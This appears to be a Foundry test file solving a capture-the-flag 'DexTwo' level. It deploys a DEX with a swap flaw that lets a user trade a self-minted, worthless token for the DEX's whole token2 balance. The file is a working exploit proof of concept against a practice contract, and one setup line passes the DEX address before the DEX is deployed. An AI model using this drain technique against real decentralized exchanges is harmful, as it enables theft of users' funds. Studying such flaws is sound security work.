// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import "openzeppelin-contracts/contracts/access/Ownable.sol";
import {Test, console} from "forge-std/Test.sol";
import "../src/Dex2.sol";

contract ExploitDex2 is Test{
    SwappableTokenTwo myToken;
    SwappableTokenTwo token1;
    SwappableTokenTwo token2;

    address user = address(0x123);
    DexTwo dex;

    function showBalances() public view {
        console.log("\n===========================================================");
        console.log("User token1 balance:", IERC20(token1).balanceOf(user));
        console.log("User token2 balance:", IERC20(token2).balanceOf(user));
        console.log("Dex token1 balance:", IERC20(token1).balanceOf(address(dex)));
        console.log("Dex token2 balance:", IERC20(token2).balanceOf(address(dex)));
    }

    function setUp() public {
        // 部署 token1 和 token2
        token1 = new SwappableTokenTwo(address(this), "Token1", "TK1", 1000000);
        token2 = new SwappableTokenTwo(address(this), "Token2", "TK2", 1000000);
        myToken = new SwappableTokenTwo(address(dex), "MyToken", "MYT", 1000000);

        // 部署 DexTwo
        dex = new DexTwo();
        dex.setTokens(address(token1), address(token2));

        // 为 ExploitDex2 提供初始代币并授权给 dex
        token1.transfer(address(this), 100);
        token2.transfer(address(this), 100);
        myToken.transfer(address(this), 100);

        token1.approve(address(dex), 100);
        token2.approve(address(dex), 100);
        myToken.approve(address(dex), 100);

        // 添加流动性
        dex.add_liquidity(address(token1), 100);
        dex.add_liquidity(address(token2), 100);
        dex.add_liquidity(address(myToken), 100);

        // 为 user 提供初始代币
        token1.transfer(user, 10);
        token2.transfer(user, 10);
        myToken.transfer(user, 100);

        showBalances();
    }

    function test_Swap() public {
        vm.startPrank(user);
        IERC20(myToken).approve(address(dex), 100);
        dex.swap(address(myToken), address(token2), 100);
        showBalances(); // token2 is **0**
    }
}